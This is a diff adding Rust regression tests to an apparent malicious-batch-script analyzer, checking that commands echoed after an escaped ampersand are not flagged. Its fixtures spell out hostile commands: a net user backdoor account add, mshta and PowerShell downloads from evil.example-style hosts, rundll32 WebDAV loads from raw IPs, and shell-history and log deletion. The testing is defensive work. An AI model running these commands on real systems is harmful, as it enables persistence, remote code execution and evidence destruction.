@@ -2283,6 +2283,38 @@ move "%cmdDestination%" "%startupFolder%"
     }
 
     #[test]
+    fn escaped_ampersand_net_user_text_does_not_emit_account_modification() {
+        let script = br#"echo keep ^& net user backdoor P@ssw0rd /add"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::AccountModification { action, account, .. }
+                    if action == "local-user-add" && account == "backdoor"
+            )),
+            "escaped ampersand echo text was misread as local-user-add: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_net_user_text_does_not_emit_enumeration() {
+        let script = br#"echo keep ^& net user backdoor P@ssw0rd /add"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "net-user" && command.contains("backdoor")
+            )),
+            "escaped ampersand echo text was misread as net user enumeration: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn escaped_ampersand_registry_hive_save_text_does_not_emit_credential_access() {
         let script = br#"echo keep ^& reg save HKLM\SAM C:\Users\Public\sam.save /y"#;
         let report = analyze(script, &AnalyzeConfig::default());
@@ -2374,6 +2406,184 @@ powershell $shellcode = @(0xfc,0x48,0x83,0xe4,0xf0)"#;
     }
 
     #[test]
+    fn escaped_ampersand_attrib_text_does_not_emit_file_concealment() {
+        let script = br#"echo keep ^& attrib +h +s C:\Users\Public\stage.exe"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::FileConcealment { target, .. }
+                    if target == r"C:\Users\Public\stage.exe"
+            )),
+            "escaped echo attrib text emitted FileConcealment: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_script_host_text_does_not_emit_exec_trait() {
+        for (script, unexpected) in [
+            (
+                br#"echo keep ^& wscript C:\Temp\stage.vbs"#.as_slice(),
+                "wscript",
+            ),
+            (
+                br#"echo keep ^& cscript //nologo C:\Temp\stage.vbs"#.as_slice(),
+                "cscript",
+            ),
+        ] {
+            let report = analyze(script, &AnalyzeConfig::default());
+
+            assert!(
+                !report.traits.iter().any(|t| matches!(
+                    (unexpected, t),
+                    ("wscript", Trait::WscriptExec { src }) if src == r#"C:\Temp\stage.vbs"#
+                ) || matches!(
+                    (unexpected, t),
+                    ("cscript", Trait::CscriptExec { src }) if src == r#"C:\Temp\stage.vbs"#
+                )),
+                "escaped echo {unexpected} text emitted script-host trait: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn escaped_ampersand_extrac32_text_does_not_emit_extrac32_trait() {
+        let script =
+            br#"echo keep ^& extrac32 /Y /C http://example.com/a.cab C:\Users\Public\a.exe"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Extrac32 {
+                    src,
+                    dst,
+                    self_reference: false,
+                } if src == "http://example.com/a.cab" && dst == r#"C:\Users\Public\a.exe"#
+            )),
+            "escaped echo extrac32 text emitted Extrac32 trait: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_mshta_text_does_not_emit_structured_download() {
+        let script = br#"echo keep ^& mshta "https://hta.example/echoed.hta""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://hta.example/echoed.hta"
+            )),
+            "escaped ampersand echo text was misread as mshta execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_mshta_local_text_does_not_resolve_download_url() {
+        let script = br#"curl -o payload.hta https://mshta-deob-local.example/echoed.hta
+echo keep ^& mshta payload.hta"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "echo keep & mshta payload.hta"
+                        && url == "https://mshta-deob-local.example/echoed.hta"
+            )),
+            "escaped ampersand echo text was misread as mshta local execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_powershell_text_does_not_extract_download() {
+        let report = analyze(
+            br#"echo keep ^& powershell -Command Invoke-WebRequest http://evil.example/p.ps1 -OutFile p.ps1"#,
+            &AnalyzeConfig::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://evil.example/p.ps1"
+            )),
+            "escaped ampersand echo text was misread as embedded PowerShell download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_python_requests_text_does_not_emit_structured_download() {
+        let script =
+            br#"echo keep ^& python -c "import requests; requests.get('https://py.example/echoed').text""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://py.example/echoed"
+            )),
+            "escaped ampersand echo text was misread as Python requests download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_rundll32_webdav_text_does_not_emit_rundll32_trait() {
+        let script = br#"echo keep ^& rundll32 \\45.9.74.36@8888\davwwwroot\x.dll,Entry"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Rundll32 { url: Some(url), .. }
+                    if url == "http://45.9.74.36:8888/x.dll"
+            )),
+            "escaped ampersand echo text was misread as rundll32 WebDAV execution: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::UncWebDavC2 { host, .. } if host == "45.9.74.36")),
+            "escaped ampersand echo text was misread as WebDAV C2: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_bare_webdav_text_does_not_emit_rundll32_trait() {
+        let script = br#"echo keep ^& rundll32 \\104.156.149.6\webdav\host.dll,XSSCheckStart"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Rundll32 { url: Some(url), .. }
+                    if url == "http://104.156.149.6/webdav/host.dll"
+            )),
+            "escaped ampersand echo text was misread as bare WebDAV rundll32 execution: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::UncWebDavC2 { host, .. } if host == "104.156.149.6")),
+            "escaped ampersand echo text was misread as bare WebDAV C2: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn escaped_ampersand_wevtutil_text_does_not_emit_evidence_cleanup() {
         let script = br#"echo keep ^& wevtutil cl Security"#;
         let report = analyze(script, &AnalyzeConfig::default());
@@ -2414,6 +2624,37 @@ powershell $shellcode = @(0xfc,0x48,0x83,0xe4,0xf0)"#;
     }
 
     #[test]
+    fn escaped_ampersand_registry_history_text_does_not_emit_evidence_cleanup() {
+        let script =
+            br#"echo keep ^& reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::AntiRecovery { action } if action == "registry-history-delete"
+            )),
+            "escaped ampersand echo text was misread as registry history cleanup: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_del_history_text_does_not_emit_evidence_cleanup() {
+        let script = br#"echo keep ^& del %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::AntiRecovery { action } if action == "powershell-history-delete"
+            )),
+            "escaped ampersand echo text was misread as PowerShell history delete: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn escaped_ampersand_powershell_cleanup_text_does_not_emit_evidence_cleanup() {
         for (script, unexpected_action) in [
             (
@@ -2449,6 +2690,21 @@ powershell $shellcode = @(0xfc,0x48,0x83,0xe4,0xf0)"#;
                 Trait::AntiRecovery { action } if action == "vssadmin-delete-shadows"
             )),
             "escaped ampersand echo text was misread as vssadmin anti-recovery: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_start_sleep_text_does_not_emit_beacon_sleep() {
+        let script = br#"echo keep ^& powershell Start-Sleep -Seconds 30"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::BeaconSleep { seconds } if *seconds == 30)),
+            "escaped echo Start-Sleep text emitted BeaconSleep: {:?}",
             report.traits
         );
     }
